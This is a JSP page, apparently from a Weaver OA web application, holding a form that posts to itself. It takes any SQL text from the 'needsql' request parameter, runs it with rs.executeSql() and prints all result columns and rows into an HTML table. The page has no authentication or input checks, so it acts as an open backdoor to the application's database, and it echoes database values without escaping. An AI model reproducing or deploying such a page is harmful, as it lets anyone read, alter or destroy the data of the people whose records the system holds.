<%@ page language="java" contentType="text/html; charset=GBK" %> 
<%@ page import="weaver.general.Util" %>
<%@ page import="java.util.*" %>
<jsp:useBean id="rs" class="weaver.conn.RecordSet" scope="page" />
<HTML><HEAD>
<LINK href="/css/Weaver.css" type="text/css" rel=STYLESHEET>
<SCRIPT language="javascript" src="/js/weaver.js"></script> 
</head>
<%
String needsql = request.getParameter("needsql");
if(needsql!=null&&!needsql.equals("")){ 
	rs.executeSql(needsql); 
}
%>
<BODY>


<FORM id=weaver name=frmmain method=post action="finalexecute.jsp">


<textarea name="needsql" cols=120 rows=10></textarea>
<br>
<% 
  
 
%>
<input type=submit name=submit>

<table border=1>
    <%  
    if(needsql!=null){
    	out.print("<tr>");
        String columns[]= rs.getColumnName();
        for(int i=0;i<columns.length;i++){
        	out.print("<td>"+columns[i]+"</td>"); 
        }
        out.print("</tr>");
        while(rs.next()){
        	out.print("<tr>");
            int cols= rs.getColCounts();
            for(int i=1;i<=cols;i++){ 
            	out.print("<td>"+rs.getString(i)+"</td>"); 
            }
            out.print("</tr>");
        }
    }
   %>

</table>

<div id='divshowreceivied' style='background:#FFFFFF;padding:3px;width:100%' valign='top'>
</div>  
  
</body>
 

<SCRIPT language="javascript">

function OnSubmit(){
	document.frmmain.submit();
}
 

var showTableDiv  = document.getElementById('divshowreceivied');
var oIframe = document.createElement('iframe');
function showreceiviedPopup(content){
    showTableDiv.style.display='';
    var message_Div = document.createElement("<div>");
     message_Div.id="message_Div";
     message_Div.className="xTable_message";
     showTableDiv.appendChild(message_Div);
     var message_Div1  = document.getElementById("message_Div");
     message_Div1.style.display="inline";
     message_Div1.innerHTML=content;
     var pTop= document.body.offsetHeight/2+document.body.scrollTop-50;
     var pLeft= document.body.offsetWidth/2-50;
     message_Div1.style.position="absolute"
     message_Div1.style.posTop=pTop;
     message_Div1.style.posLeft=pLeft;

     message_Div1.style.zIndex=1002;

     oIframe.id = 'HelpFrame';
     showTableDiv.appendChild(oIframe);
     oIframe.frameborder = 0;
     oIframe.style.position = 'absolute';
     oIframe.style.top = pTop;
     oIframe.style.left = pLeft;
     oIframe.style.zIndex = message_Div1.style.zIndex - 1;
     oIframe.style.width = parseInt(message_Div1.offsetWidth);
     oIframe.style.height = parseInt(message_Div1.offsetHeight);
     oIframe.style.display = 'block';
}
 

function ajaxinit(){
    var ajax=false;
    try {
        ajax = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
        try {
            ajax = new ActiveXObject("Microsoft.XMLHTTP");
        } catch (E) {
            ajax = false;
        }
    }
    if (!ajax && typeof XMLHttpRequest!='undefined') {
    ajax = new XMLHttpRequest();
    }
    return ajax;
}
 
</script>
</html>
 